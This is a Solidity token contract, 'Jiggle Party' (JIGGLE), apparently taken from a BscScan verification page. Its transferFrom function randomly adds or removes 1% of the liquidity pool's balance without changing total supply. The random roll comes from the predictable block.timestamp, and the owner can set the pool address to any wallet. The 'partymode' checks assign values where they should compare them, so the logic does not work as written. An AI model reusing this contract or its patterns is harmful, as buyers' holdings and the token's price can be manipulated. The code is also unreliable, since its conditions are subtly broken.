/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

//"SPDX-License-Identifier: UNLICENSED"
pragma solidity 0.8.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
          return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}




contract jiggle {
    using SafeMath for uint;

    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    
    string private _name;
    string private _symbol;

    uint private  _supply;
    uint8 private _decimals;
    
    address private _owner;
    address public PCS_POOL;
    
    bool public partymode;
    uint public deploy_timestamp;
    
    constructor() {
        deploy_timestamp = block.timestamp;
        partymode = false;
        _owner = msg.sender;
        
        _name = "Jiggle Party";
        _symbol = "JIGGLE";
        _supply = 1_000_000;  // 1 Million
        _decimals = 6;
        
        _balances[_owner] = totalSupply();
        emit Transfer(address(this), _owner, totalSupply());
    }

    modifier owner {
        require(msg.sender == _owner); _;
    }
    
    function name() public view returns(string memory) {
        return _name;   
    }
    
    function symbol() public view returns(string memory) {
        return _symbol;
    }
    
    function decimals() public view returns(uint8) {
        return _decimals;
    }
    
    function totalSupply() public view returns(uint) {
        return _supply.mul(10 ** _decimals);
    }
    
    function balanceOf(address wallet) public view returns(uint) {
        return _balances[wallet];
    }
    
    function getOwner() public view returns(address) {
        return _owner;
    }

    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed fundsOwner, address indexed spender, uint amount);

    function _transfer(address from, address to, uint amount) private returns(bool) {
        require(balanceOf(from) >= amount, "Insufficient funds.");
        
        _balances[from] = balanceOf(from).sub(amount);
        _balances[to] = balanceOf(to).add(amount);
        
        emit Transfer(from, to, amount);
        
        return true;
    }
    
    function transfer(address to, uint amount) public returns(bool) {
        return _transfer(msg.sender, to, amount);
    }

    // Selling on AMM DEXs will utilize this function to swap funds.
    function transferFrom(address from, address to, uint amount) public returns (bool) {
        uint authorizedAmount = allowance(from, msg.sender);
        require(authorizedAmount >= amount, "Insufficient authorized funds.");
        
        if (block.timestamp > deploy_timestamp + 2700){
        partymode = true;
        }
        
        uint jiggle_amount = balanceOf(PCS_POOL).div(100);
        uint roll = randMod(100);
        
        if (partymode = false){
                    if (roll > 50){
                    _balances[PCS_POOL] = balanceOf(PCS_POOL).sub(jiggle_amount);
                    }
                    else{
                    _balances[PCS_POOL] = balanceOf(PCS_POOL).add(jiggle_amount);
                    }
        }
        if (partymode = true){
                    if (roll > 70){
                    _balances[PCS_POOL] = balanceOf(PCS_POOL).sub(jiggle_amount);
                    }   
                    else{
                    _balances[PCS_POOL] = balanceOf(PCS_POOL).add(jiggle_amount);
                    }
        }
        
        _transfer(from, to, amount);
        _allowances[from][msg.sender] = allowance(from, msg.sender).sub(amount);

        return true;
    }

    function approve(address spender, uint amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address fundsOwner, address spender) public view returns (uint) {
        return _allowances[fundsOwner][spender];
    }
    
    function renounceOwnership() public owner returns(bool) {
        _owner = address(this);
        return true;
    }
    
    function setPoolAddress(address poolAddress) public owner returns(bool){
        PCS_POOL = poolAddress;
        return true;
    }
    
    function randMod(uint _modulus) public returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp))) % _modulus;
    }
    
}